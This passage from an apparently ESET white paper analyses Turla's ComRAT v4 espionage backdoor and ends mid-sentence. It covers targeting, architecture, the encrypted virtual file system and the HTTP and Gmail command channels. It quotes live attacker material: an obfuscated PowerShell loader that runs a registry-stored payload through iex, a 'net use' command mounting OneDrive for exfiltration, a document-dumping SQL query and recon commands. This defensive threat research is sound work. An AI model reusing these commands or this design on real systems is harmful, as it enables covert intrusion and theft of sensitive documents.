{
    "id": "08a301db-7e8a-4776-9769-66cc03218b35",
    "created_at": "2022-10-25T16:48:20.834421Z",
    "updated_at": "2025-03-27T02:17:27.631064Z",
    "deleted_at": null,
    "sha1_hash": "7bcdfae2ef025893a57007a928a4c633f6beea1d",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-05-21T19:48:02Z",
    "file_modification_date": "2020-05-25T16:58:42Z",
    "file_size": 1012735,
    "plain_text": "# FROM AGENT.BTZ\n TO COMRAT V4\n\n## A ten-year journey\n\n#### Matthieu Faou\n\n\n-----\n\n#### TABLE OF CONTENTS\n\n1. Executive Summary  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 4\n\n2. Turla Profile .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  5\n\n2.1 Publicized high-profile attacks  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  5\n\n2.2 Victimology  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 5\n\n2.3 Tools and tactics .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  6\n\n3. Overview .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 6\n\n3.1 From Agent.BTZ to ComRAT v4 .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  6\n\n3.2 Targeting  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 7\n\n3.3 Attribution to Turla .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 7\n\n3.4 Insight into attacker’s activity  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 7\n\n4. ComRAT v4  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 9\n\n4.1 Installation and persistence  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  9\n\n4.2 Orchestrator  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  10\n\n4.3 Development .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  12\n\n4.4 Virtual File System and configuration .   .   .   .   .   .   .   .   .   .   .   .   . 13\n\n4.5 Command & Control channels  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  15\n\n4.6 Backdoor commands .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   19\n\n5. Conclusion .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 20\n\n6. Bibliography  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 21\n\n7. Indicators of Compromise .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 23\n\n7.1 Hashes  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  23\n\n7.2 Paths .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 23\n\n7.3 Windows registry .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 23\n\n7.4 Network .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 23\n\n8. MITRE ATT&CK Techniques .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 24\n\n\n-----\n\n#### LIST OF TABLES\n\nTable 1 _List of backdoor commands in ComRAT v4  .   .   .   .   .   .   .   .   .   .   .   . 19_\n\n#### LIST OF FIGURES\n\nFigure 1 _Timeline of important attacks attributed to Turla  .   .   .   .   .   .   .   .   .   . 5_\n\nFigure 2 _ComRAT v4 PDB path .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 7_\n\nFigure 3 _Timeline of ComRAT .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   7_\n\nFigure 4 _SQL command to dump documents from the central database_\n_(partially redacted) .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   8_\n\nFigure 5 _Command to mount a OneDrive folder using net use (partially redacted)  .  8_\n\nFigure 6 _Basic recon of the compromised machine .   .   .   .   .   .   .   .   .   .   .   .   8_\n\nFigure 7 _Turla operators’ working hours  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 9_\n\nFigure 8 _Injection of the orchestrator into the Explorer process .   .   .   .   .   .   .   .  10_\n\nFigure 9 _Screenshot of ComRAT v4 64-bit orchestrator DLL in Detect It Easy .   .   .  10_\n\nFigure 10 _Summary of ComRAT architecture  .   .   .   .   .   .   .   .   .   .   .   .   .   .   11_\n\nFigure 11 _Business hours check .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 12_\n\nFigure 12 _Example of Abstract Factory method pattern .   .   .   .   .   .   .   .   .   .   .  12_\n\nFigure 13 _Example of Adapter pattern .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   12_\n\nFigure 14 _Example of Mediator pattern .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  12_\n\nFigure 15 _First bytes of the decrypted FAT16 Virtual File System .   .   .   .   .   .   .   .  13_\n\nFigure 16 _Virtual File System hierarchy  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  14_\n\nFigure 17 _Content of /etc/transport/legacy/get.list .   .   .   .   .   .   .   .  14_\n\nFigure 18 _Generation of the pipe name .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   15_\n\nFigure 19 _Overview of the email C&C mode .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 16_\n\nFigure 20 _Contents of /etc/transport/mail/mailboxes/0/cookie.str_\n_(partially redacted) .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  16_\n\nFigure 21 _Example of the Gmail simplified HTML view (for demonstration purpose only) 17_\n\nFigure 22 _Contents of /etc/transport/mail/service/subject  .   .   .   .   .   17_\n\nFigure 23 _Email from the Gmail inbox that contains commands in the attachment_\n_(partially redacted and opened in Microsoft Outlook for demonstration_\n_purposes only) .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  17_\n\nFigure 24 _Decrypted attachment  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  18_\n\nFigure 25 _Email sent by ComRAT to the operators’ email address_\n_(partially redacted and opened in Microsoft Outlook for demonstration_\n_purposes only) .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  19_\n\n\n-----\n\n#### 1. EXECUTIVE SUMMARY\n\nTurla, also known as Snake, is one of oldest cyberespionage groups still active, with more than a decade\nof experience. Its operators mainly focus on high-profile targets such as governments and diplomatic\nentities in Europe, Central Asia and the Middle East. They are known for having breached major organizations\nsuch as the US Department of Defense in 2008 and the Swiss defense company RUAG in 2014. More recently,\nseveral European countries including France and the Czech Republic went public to denounce Turla’s attacks\nagainst their governments.\n\nTo perform these operations, Turla’s operators maintain a large arsenal of malware including a rootkit,\nseveral complex backdoors aimed at different platforms, including Microsoft Exchange mail servers,\nand a large range of tools to enable pivoting on a network.\n\nIn this white paper, we present our analysis of the latest version of one their oldest backdoors,\npublicly known as ComRAT.\n\nKey points in this white paper:\n\n- Turla has used ComRAT since at least 2007.\n\n- ComRAT v4 was first seen in 2017 and known still to be in use as recently as January 2020.\n\n- We identified at least three targets: two Ministries of Foreign Affairs and a national parliament.\n\n- ComRAT was used to exfiltrate sensitive documents. The operators used public cloud services\n\nsuch as OneDrive and 4shared to exfiltrate data.\n\n- ComRAT is a complex backdoor developed in C++.\n\n- ComRAT uses a Virtual File System formatted in FAT16.\n\n- ComRAT is deployed using existing access methods, such as the PowerStallion PowerShell backdoor [1].\n\n- ComRAT has two Command and Control channels\n\n  - HTTP: It uses exactly the same protocol as ComRAT v3\n\n  - Email: It uses the Gmail web UI to receive commands and exfiltrate data\n\n- ComRAT can perform many actions on the compromised computers, such as executing additional\n\nprograms or exfiltrating files.\n\n\n-----\n\n#### 2. TURLA PROFILE\n\nTurla, also known as Snake, is an infamous espionage group active for at least a decade. The group is well\nknown for its advanced custom tools and its ability to run highly targeted operations.\n\n##### 2.1 Publicized high-profile attacks\n\nOver the past ten years, Turla has been responsible for numerous high-profile breaches. The targets include\nthe United States Central Command in 2008 [2], the Finnish Ministry of Foreign Affairs in 2013 [3], the Swiss\nmilitary company RUAG in 2014 [4] and the German Foreign Office in 2017 [5]. More recently, they allegedly\ncompromised the French Armed Forces in 2018 [6] and the Austrian Foreign Ministry in 2019 [7]. The timeline\nin Figure 1 presents some of the major attacks attributed to Turla.\n\n\n### 2008\n\nUS Central Command\n\n##### 2.2 Victimology\n\n\n### 2013\n\n\n### 2014\n\n\n### 2017\n\nGerman Foreign\n### 2019 2018 Office\n\n\nAustrian Foreign\nMinistry\n\n\nFrench Armed Forces\n\n\nFigure 1 // Timeline of important attacks attributed to Turla\n\n\nAs opposed to some other APT (Advanced Persistent Threat) groups, Turla is far from being opportunistic\nin the selection of its targets. The group is interested in collecting information from strategic organizations.\nIn addition, to our knowledge, Turla has never conducted cybersabotage operations, such as those made\nby GreyEnergy [8] or TeleBots [9].\n\nWith several years of experience tracking this espionage group, we have identified the most at-risk types\nof organizations:\n\n- Ministries of Foreign Affairs and diplomatic representations (embassies, consulates, etc.)\n\n- Military organizations\n\n- Regional political organizations\n\n- Defense contractors\n\nOther APT groups might also be targets of interest for Turla. In June 2019, Symantec reported [10]\n[that Turla had hijacked OilRig infrastructure and used it to drop its own malware onto existing OilRig](https://attack.mitre.org/groups/G0049/)\nvictims’ networks.\n\nAccording to our telemetry and public information, Turla seems to target organizations in most parts\nof the world. Moreover, over the past few years, we have noticed that geographical areas of conflict,\nsuch as Eastern Europe and the Middle East, are under heavy attack from this APT group. However, even\nwith this recent focus, it has not abandoned its traditional targets in Western Europe and Central Asia.\n\n\n-----\n\n##### 2.3 Tools and tactics\n\nThe usual modus operandi of Turla’s operators is to use basic first-stage malware for initial reconnaissance.\nIn some cases they even use generic tools such as Metasploit [11] [12]. If they deem a victim interesting\nenough, they switch to more advanced malware such as Carbon [13] or Gazer [14].\n\nThe initial compromise is generally tailored towards specific types of victims. They mainly rely on spearphishing\nemails [15], watering hole attacks [16] [17] or Man-in-the-Middle attacks [18].\n\nAfter this initial compromise step, they move laterally on the network and collect credentials.\nTo avoid suspicious communications to the internet, they developed tools such as DarkNeuron [19]\nand RPC Backdoor [1], to forward commands and exfiltrate data from the local network. They also\nregularly create user accounts that they use later if they lose access to a compromised machine. This all\nmeans that once compromised, it is very hard to eject the attacker from the network without rebuilding\nmost of it.\n\nFinally, collected data are exfiltrated through various channels such as HTTP, email or cloud storage.\nTurla’s operators usually rely on compromised web servers for the first C&C level. They are also known\nfor using Cloudflare and SATCOM IP addresses to hide the real destination of this traffic [20].\n\nTurla’s operators have at their disposal a wide arsenal of malware tools for all major desktop platforms:\nWindows, macOS and Linux. Some of these tools stand out for their complexity, such as the Snake rootkit,\nwhich relies on a vulnerable VirtualBox driver to bypass Windows Driver Signature Enforcement [21]. Some\nothers stand out for their originality, such as the Outlook backdoor we analyzed in 2018 [22] or LightNeuron,\na backdoor targeting Microsoft Exchange [23].\n\nDuring our several years of tracking Turla’s activities, we have also noticed that its operators react quickly\nto both detection and publication. Apparently, they do not hesitate to remove their tools and clean some\nartefacts such as malware logs, and potentially lose control of a machine, if they feel they will be detected\nsoon. They probably do not want their more-advanced malware to be exposed publicly.\n\n#### 3. OVERVIEW\n\n##### 3.1 From Agent.BTZ to ComRAT v4\n\nAgent.BTZ is a Remote Access Trojan (RAT) that became infamous after its use in a breach of the US military\nin 2008 [24]. The first version of this malware, seen in 2007, exhibited worm capabilities by spreading\nthrough removable drives. Later, this malware family, along with other families such as the Snake rootkit,\nwas attributed to an APT group dubbed Turla.\n\nFrom 2007 to 2012, two new major versions of the RAT, later named ComRAT, were released as described\nby G DATA [25]. Interestingly, both employed the well-known Turla XOR key:\n\n```\n1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6\n\ngs923HL34x2f5cvd0fk6c1a0s\n\n```\n\nThen, and until mid-2017, Turla developers made a few changes to ComRAT but it was still using a very\nsimilar code base.\n\nIn 2017, we noticed that a very different version of ComRAT was released. As shown in Figure 2, it is version 4\nof a malware family its authors dubbed Chinch. It was also the internal name the developers used\nfor the previous versions.\n\n\n-----\n\nFigure 2 // ComRAT v4 PDB path\n\nThis new version uses a completely new code base and is far more complex than its predecessors. It takes\nsome inspiration from Snake, the rootkit used by Turla with, for instance, a Virtual File System formatted\nin FAT16. Figure 3 provides an overview of ComRAT history.\n\n\n### 2007\n\nComRAT v1 release\n\n### 2020\n\nComRAT v4 use still\ncontinuing\n\n##### 3.2 Targeting\n\n\n### 2008\n\n\n### 2008\n\n\n### 2012\n\nComRAT v3\n### 2017 2017 release\n\n\nComRAT v4 release\n\n\nLast known ComRAT v3\nactivity\n\n\nFigure 3 // Timeline of ComRAT\n\n\nDuring our investigation, we were able to identify three different targets where ComRAT v4 has been used:\n\n- Two Ministries of Foreign Affairs in Eastern Europe\n\n- One national parliament in the Caucasus region\n\nThis targeting is in-line with other campaigns we described in the past.\n\n##### 3.3 Attribution to Turla\n\nBased on the victimology and the TTPs, we believe that ComRAT is used exclusively by a single APT group.\n\nMoreover, there are a few elements linking ComRAT v4 to Turla:\n\n- It uses the same internal name, Chinch, as the previous versions\n\n- It uses the same custom C&C protocol over HTTP as ComRAT v3\n\n- A part of the network infrastructure is shared with Mosquito [18]\n\n- It was dropped by, or has dropped other, Turla malware families:\n\n  - A PowerShell loader [1]\n\n  - The PowerStallion backdoor [1]\n\n  - The RPC Backdoor [1]\n\nTherefore, we believe that the ComRAT v4 malware family is part of the Turla arsenal.\n\n##### 3.4 Insight into attacker’s activity\n\nDuring our investigation, we were able to get insights about what Turla operators were doing\non the compromised machines.\n\nThe main use of ComRAT is discovering, stealing and exfiltrating confidential documents. In one case,\nits operators even deployed a .NET executable to interact with the victim’s central MS SQL Server database\ncontaining the organization’s documents. Figure 4 is the redacted SQL command.\n\n\n-----\n\nsqlCommand.CommandText = “select top “ + num2.ToString() + “ filename, img,\ndatalength(img), id from <Redacted> with(nolock) where not img is null and id>” + num4.\n```\nToString();\n\n```\nsqlCommand.CommandText += “ and datalength(img)<1500000 and (filename like ‘%.doc’\nor filename like ‘%.docx’ or filename like ‘[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%.pdf’\nor (filename like ‘3%.pdf’ and len(filename)>9))”;\nsqlCommand.CommandText += “ order by id”;\n\n\nFigure 4 // SQL command to dump documents from the central database (partially redacted)\n\nThese documents were then compressed and exfiltrated to a cloud storage provider such as OneDrive\nor 4shared. Cloud storage is mounted using the net use command as shown in Figure 5.\n\n\ntracert -h 10 yahoo.com\nnet use https://docs.live.net/E65<redacted> <redacted password>\n/u:<redacted>@aol.co.uk\ntracert -h 10 yahoo.com\n\n\nFigure 5 // Command to mount a OneDrive folder using net use (partially redacted)\n\nIn addition to document stealing, the operators also run many commands to gather information about\nthe Active Directory groups or users, the network or Microsoft Windows configurations such as the group\npolicies. Figure 6 is a list of commands executed by Turla operators.\n\n```\ngpresult /z\ngpresult /v\ngpresult\nnet view\nnet view /domain\nnetstat\n\n```\nnetstat -nab\nnetstat -nao\n```\nnslookup 127.0.0.1\n\n```\nipconfig /all\narp -a\n```\nnet share\nnet use\nsysteminfo\nnet user\nnet user administrator\nnet user /domain\nnet group\nnet group /domain\nnet localgroup\nnet localgroup\nnet localgroup Administrators\n\n```\nnet group “Domain Computers” /domain\nnet group “Domain Admins” /domain\nnet group “Domain Controllers” /domain\ndir “%programfiles%”\nnet group “Exchange Servers” /domain\n```\nnet accounts\nnet accounts /domain\nnet view 127.0.0.1 /all\nnet session\nroute print\n\n```\nipconfig /displaydns\n\n\nFigure 6 // Basic recon of the compromised machine\n\n\n-----\n\nFinally, we also noticed that Turla operators are aware of and try to evade security software. For instance,\nthey regularly exfiltrate security-related log files in order to understand whether their malware samples\nhave been detected. This shows the level of sophistication of this group and its intention to stay\non the same machines for a long time.\n\nWe also extracted the times at which Gmail received the emails sent by the operators, which should be\nvery close to the time at which commands were sent by the operators through the email C&C channel.\nWe believe this is a good metric because the emails are later processed by the backdoor. Thus, it shows\nthe time at which the operators were working and not the time at which the infected computer executed\nmalicious commands.\n\nFigure 7 represents the time of day that commands were sent, in a one-month period. Given the distribution,\nit is likely that the operators are working in the UTC+3 or UTC+4 time zone.\n\n###### Number of emails received\n\n40\n\n**UTC timezone** **UTC+3 timezone**\n\n30\n\n20\n\n\n0\n\n\n**Hour**\n\n|Col1|Col2|Col3|Col4|Col5|Hour|Col7|Col8|Col9|Col10|Col11|Col12|Col13|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|\n\n\n**UTC+3 timezone**\n\n**Hour**\n\n\n0 2 4 6 8 10 12 14 16 18 20 22\n\nFigure 7 // Turla operators’ working hours\n\n#### 4. COMRAT V4\n\nAccording to its compilation timestamp, which is likely genuine, the first known sample of ComRAT v4\nwas compiled in April 2017. The most recent iteration of the backdoor was, to the best of our knowledge,\ncompiled in November 2019. In this section, we will describe a sample compiled in March 2019, but it is very\nsimilar to the latest version.\n\n##### 4.1 Installation and persistence\n\nBased on ESET telemetry, we believe that ComRAT is installed using an existing foothold such as compromised\ncredentials or via another Turla backdoor. For instance, we’ve seen ComRAT installed by PowerStallion,\na PowerShell-based backdoor we described in 2019 [1].\n\nThe ComRAT installer is a PowerShell script that creates a Windows scheduled task and fills\na registry value with the encrypted payload. The registry value is usually\n\nHKLM\\SOFTWARE\\Microsoft\\SQMClient\\Windows.WSqmCons\n\n\n**UTC timezone**\n\n**Hour**\n\n\n-----\n\nThe Windows task is usually in C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\\n```\nCustomer Experience Improvement Program\\Consolidator and contains the following command:\n\n```\n\n<Actions Context=”WinSQMAccount”>\n<Exec>\n<Command>cmd.exe</Command>\n<Arguments>/c “%SystemRoot%\\System32\\wsqmcons.exe &amp; powershell.\nexe -v 2 “$QAY076ai = ‘AKWC;HUA389933tomasoas’;[Text.Encoding]::ASCII.\nGetString([Convert]::\\”Fr`omBa`se6`4Str`ing\\”((gp HKLM:\\SOFTWARE\\Microsoft\\SQMClient\\\nWindows).WSqmCons))|iex;””</Arguments>\n</Exec>\n</Actions>\n\n\nNote that the password used to decrypt the ComRAT payload is different on each machine.\n\nIt is interesting to note that while ComRAT’s name is derived from its use of COM object hijacking,\nin this new version the developers no longer use this method for ensuring persistence.\n\n##### 4.2 Orchestrator\n\nThe PowerShell loader is executed every time the user logs in. It is very similar to the cluster of loaders\n[we described in 2019 [1] and is based on the Invoke-DllInjection loader from the PowerSploit framework.](https://github.com/PowerShellMafia/PowerSploit)\nIt loads the ComRAT orchestrator DLL into explorer.exe as shown in Figure 8.\n\nFigure 8 // Injection of the orchestrator into the Explorer process\n\nThis is a C++ DLL existing in 32- and 64-bit versions. It has two exports named UMEP and VFEP.\nThe 64-bit version is called x64_Release.dll as shown in Figure 9.\n\nFigure 9 // Screenshot of ComRAT v4 64-bit orchestrator DLL in Detect It Easy\n\n\n-----\n\nThe orchestrator embeds an encrypted (XORed with a hardcoded key) communication module\n(a 32- or 64-bit DLL) that will be injected into the default web browser. The orchestrator interacts\nwith the ComRAT communication module (described in more detail later) through a named pipe. Thus,\nall of the malware’s network communications will be initiated in the browser process, which is stealthier\nthan if it was done directly by the orchestrator.\n\nThe orchestrator has some interesting features such as a Virtual File System (VFS) in FAT16 format, which\nwe describe later, and it can use Gmail to receive commands and to exfiltrate information to the operators.\nFigure 10 is an overview of ComRAT’s architecture.\n\nExisting access\nto the victim's computer\n_Ex: PowerStallion_\n\nExecute\n\n**</>**\n\nPowerShell\nscript\n\nWrite Create\n\n\nEncrypted payload\nin Windows Registry\n\nInject\ncommunication\nlibrary\n\nDefault browser\n\n**GMAIL**\n\nC&C Server Gmail address\n\nTurla operator\n\n\nLoad payload\nin explorer.exe\n\n**exe**\n\nOrchestrator running\nin explorer.exe\n\nHTTP request/response\nin a named pipe\n\n\nWindows task\nfor persistence\n\nVirtual FAT16\nFile System\n\n\n###### >[_]\n\n\nCommands\n\nExfiltrate documents\nto various cloud services\n\nNetwork and Active\nDirectory recon\n\nDrop and execute additional\nmalware programs\n\nMonitor security logs\n\n\nFigure 10 // Summary of ComRAT architecture\n\n\n-----\n\nThe orchestrator is programmed to sleep outside local business hours (9 to 5, Monday to Friday),\nas shown in Figure 11.\n\nFigure 11 // Business hours check\n\n##### 4.3 Development\n\nOur in-depth analysis of this malware family leads us to believe that the ComRAT developers are both\nexperienced and spent time designing the malware architecture.\n\nWe noticed that they used several design patterns. For example, they use the so-called Abstract Factory\npattern [26] in the code responsible for parsing and creating instructions based on C&C communications,\nas shown in Figure 12. It is interesting to note that it was implemented using a C++ template. Thus, there\nis a lot of duplicated code in the compiled binary because each templated class or function will have\na different implementation for each type it is used with.\n\nFigure 12 // Example of Abstract Factory method pattern\n\nThey also have used other design patterns, such as the Adapter pattern [27], shown in Figure 13,\nand the Mediator pattern [28], shown in Figure 14.\n\nFigure 13 // Example of Adapter pattern\n\nFigure 14 // Example of Mediator pattern\n\nIt should be noted that, in addition to complex elements such as a FAT16 VFS, ComRAT’s developers\nuse some obfuscation. Most of the strings in their binaries are string-stacked and encrypted, with a different\nkey per sample, with the apparent goal of preventing easy detection of this malware family.\n\nFinally, they use several third-party libraries:\n\n- _[fat_io_lib: for the Virtual File System](https://github.com/ultraembedded/fat_io_lib)_\n\n- _[Gumbo: to parse HTML](https://github.com/google/gumbo-parser)_\n\n- _[wolfCrypt: for C&C data (en|de)cryption](https://github.com/wolfSSL/wolfssl)_\n\nOverall, it tells us that the Turla group tasked experienced developers for this new version of ComRAT.\nBoth the development effort and the technologies used, such as the Virtual File System, make it a counterpart\nof Carbon [13] and Gazer [14].\n\n\n-----\n\n##### 4.4 Virtual File System and configuration\n\nAll the files related to ComRAT, except the orchestrator DLL and scheduled task, are stored in a Virtual\nFile System. This is a regular file stored at one of these locations:\n\n- %TEMP%\\FXSAPIDebugTrace.txt\n\n- %TEMP%\\iecache.bin\n\nHowever, once decrypted, these files are FAT16 partition images, as shown in Figure 15.\n\nFigure 15 // First bytes of the decrypted FAT16 Virtual File System\n\nThe encryption key is unique per machine, as it is generated during the installation. It uses a variant\n[of Mersenne Twister and takes its seed from std::_Random_device. This 32-byte key is then stored](https://en.wikipedia.org/wiki/Mersenne_Twister)\nin (HKLM|HKCU)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\\n{59031A47-3F72-44A7-80C5-5595FE6B30EE}\\Order\n\nThe VFS is encrypted using AES-256 in XTS mode. This mode of operation is a standard for disk encryption.\nThe first 16-bytes of the key are used for the block encryption while the last 16-bytes are used to derive\nthe initialization vector from the sector number.\n\nThe default VFS container file is hardcoded in the orchestrator and dropped the first time it is executed.\nThen, most of the files can be updated using backdoor commands.\n\nIt uses UNIX-like paths so, for example, the log file is located at /var/log/working.c4log. The malware\nuses a third-party library, fat_io_lib, to read the partition. Figure 16 is an overview of the files and folders\nin the VFS.\n\n\n-----\n\nFAT16 Virtual\nFile System\n\nvar\n\nlog\n\nworking.c4log\n\n_Contains_\n_log files_\n\n_Contains the configuration_\n_related to C&C communications_\n\n_Contains the encryption_\n_keys (AES and RSA)_\n_used for the C&C communications_\n\n\n<Executables>\n\n_Probably contains_\n_modules (PE executables)_\n_but we haven’t seen any_\n_in the wild._\n\n\ndir_set_ipconfig.c4\n\n\n_Contains backdoor commands that will be executed_\n_automatically. For example, /etc/auto_exec/send_log.c4_\n_executes the backdoor command 106: SendWorkingLog._\n\n_Contains commands_\n_executed at startup._\n\nFigure 16 // Virtual File System hierarchy\n\n\nIt is interesting to note that some files use extensions such as c4 or c4log, where c4 most likely stands\nfor Chinch 4, the internal name of the malware family.\n\nBy mounting the Virtual File System, we get access to all these files. Figure 17 is an example\nof /etc/transport/legacy/get.list content. This is a list of C&C domains separated with a pipe.\n\nFigure 17 // Content of /etc/transport/legacy/get.list\n\n\n-----\n\n##### 4.5 Command & Control channels\n\nComRAT v4 has two different C&C channels: HTTP (internally known as legacy) and email\n(internally known as mail), which uses the Gmail web interface. The mode to be used\n(legacy, mail or any) is specified in the file /etc/transport/service/current_transport.str\n\n###### Communication module\n\nThe orchestrator retrieves the default browser, by checking HKCR\\http\\shell\\open\\command,\nand injects the communication DLL, either 32- or 64-bit, into it. These DLLs are hardcoded in the orchestrator\nand XORed with a static key.\n\nThis module is quite simple as it is just a “bridge” between the orchestrator and the C&C server. The goal\nis probably to make the malware’s HTTP requests to its C&C appear to be from a process that would\nbe expected to connect to the internet and make HTTP requests.\n\nThe orchestrator uses a named pipe to interact with the communication module. The pipe name is derived\nfrom the computer name as shown on Figure 18.\n\nFigure 18 // Generation of the pipe name\n\nThe orchestrator sends C&C requests to the communication module, which sends them to the C&C server,\nand that module sends any responses or new commands from the C&C server to the orchestrator,\nusing the same pipe.\n\nThe communication DLL is slightly obfuscated, in a very similar way to many other Turla malware families.\nAll the strings are string-stacked, some of them XORed, and most of the Windows APIs it uses are resolved\ndynamically.\n\n###### Legacy/HTTP[S]\n\nThe most basic C&C mode is what the ComRAT developers called legacy mode. Indeed, it is the exact same\nprotocol as implemented in ComRAT v3.x.\n\nWe believe that it is intended to be compatible with C&C servers already in place, avoiding the need\nto deploy a whole new set of servers. It also gives the operators the flexibility to control old ComRAT\ninstances without the need to upgrade all the victims to version 4. Even if this is an old C&C protocol,\nit was still being used in the wild in 2020.\n\nTwo lists of C&C servers are stored in the VFS at the paths: /etc/transport/legacy/get.list\nand /etc/transport/legacy/post.list\n\nThey generally each contain two or three different domains, separated with a pipe character.\n\nThe format of the URL is quite easy to recognize as it hasn’t changed for years:\n\nhttp[s]://<C&C domain>/index/index.php?h=<base64 XOR key>&d=<base64 XORed data>\n\nThe h parameter contains an 8-byte XOR key encoded in base64. It is generated using the rand function\nseeded by the result of a call to the GetTickCount function.\n\nThe d parameter contains the base64-encoded data. It is encrypted using the XOR key in the h parameter.\n\n\n-----\n\nEmail\n\nThe second C&C mode is called mail by ComRAT developers. The code is actually very specific to Gmail\nand we haven’t seen any other version of ComRAT able to use another email provider.\n\nA basic overview of the email C&C mode is shown Figure 19.\n\n**ComRAT**\n\nRead the email address\n\n**1** and the authentication\n\ncookies in the Virtual\nFile System\n\n**2** Connect to the Gmail web UI commands Send\n\nby email\n\n**3** Parse the HTML\n\nof the inbox\n\nControl\n\n**4** Download the email the mailbox\n\nattachments\n\nOperator mailbox Turla operator\n_(often on GMX)_\n\n**5** Decrypt each\n\nattachment\n\n**6** Execute\n\nthe commands\n\nReceive\n\n**7** Send the result command results\n\nback by email by email\n\nFigure 19 // Overview of the email C&C mode\n\nStep 1\n\nThe orchestrator reads the email address in /etc/transport/mail/mailboxes/0/command_addr\n\nIt also reads the cookies to authenticate on Gmail in /etc/transport/mail/mailboxes/0/cookie\n\nThese cookies typically have a limited lifetime so they should be updated from time to time.\nFigure 20 is a redacted screenshot of the contents of the cookie file.\n\nFigure 20 // Contents of /etc/transport/mail/mailboxes/0/cookie.str (partially redacted)\n\n\n-----\n\nStep 2\n\nIt connects to the basic HTML view of Gmail at the URL https://mail.google.com/mail/?ui=html&zy=g using\nthe cookies described above. An example of such a view is shown Figure 21.\n\nFigure 21 // Example of the Gmail simplified HTML view\n\n_(for demonstration purpose only)_\n\nStep 3\n\n[It parses the inbox HTML page using the Gumbo HTML parser in order to extract the list of emails. It will only](https://github.com/google/gumbo-parser)\nread emails for which the Subject: is in the list at /etc/transport/mail/service/subject, as shown\nin Figure 22.\n\nFigure 22 // Contents of /etc/transport/mail/service/subject\n\nThen, for each email, it extracts the link to download the attachment. The attachments are generally\nmasquerading as documents with names such as document.docx and documents.xlsx. The body\nof the email is generally empty. Figure 23 is an example of an email sent by Turla operators\nto a ComRAT C&C mailbox.\n\nFigure 23 // Email from the Gmail inbox that contains commands in the attachment\n(partially redacted and opened in Microsoft Outlook for demonstration purposes only)\n\n\n-----\n\nStep 4\n\nIt downloads all the relevant attachments from Gmail. The email is then deleted so that it is not processed\na second time.\n\nStep 5\n\nDespite their extensions, the attachments are not docx or xslx files. They contain a blob of data\nin the following format:\n\n**0** **4** **8** **9** **9+n**\n\n<victim id> CRC32 of the 0x01 AES-encrypted\nencrypted data data\n\nThe AES-256 key is stored in the VFS in /etc/pki/aes_key and it uses AES in CBC mode with\na null initialization vector.\n\nStep 6\n\nOnce decrypted, we have access to the backdoor commands and parameters. We provide more details\nabout the backdoor commands in section 4.6. Figure 24 is an example of a decrypted email attachment.\n0x67 is the ID for “Execute a command with cmd.exe” and it is followed by the command to execute.\nWe believe that the beginning of the decrypted data is filled with random bytes.\n\nFigure 24 // Decrypted attachment\n\nStep 7\n\nThe backdoor creates an attachment containing the result of the commands. The attachment name consists\nof 20 random digits and of the .jpg.bfe so-called double extension. Its content has the following format:\n\n**0** **4** **8** **9** **265** **265+n**\n\n<victim id> CRC32 of the 0x01 AES-encrypted\nencrypted data data\n\nRSA-encrypted\nAES key (+padding)\n\nThe AES key is different for each email as it is randomly generated. Then, it is encrypted using RSA-2048\nwith the public key stored in /etc/pki/public_cert.pki. The format of the key is quite unusual\nas it is raw bytes representing the concatenation of n and e. Turla’s developers did not implement\nthe RSA encryption themselves; they used code from the wolfSSL library and more specifically\nfrom a commit before March 2016.\n\n\n-----\n\nFinally, and using the Gmail web interface as before, the backdoor sends the email to the address contained\nin /etc/transport/mail/mailboxes/0/answer_addr. This address is typically not hosted on Gmail\nbut rather on GMX or VFEmail. It is also the email address from which the operators send commands\nto the Gmail address. Figure 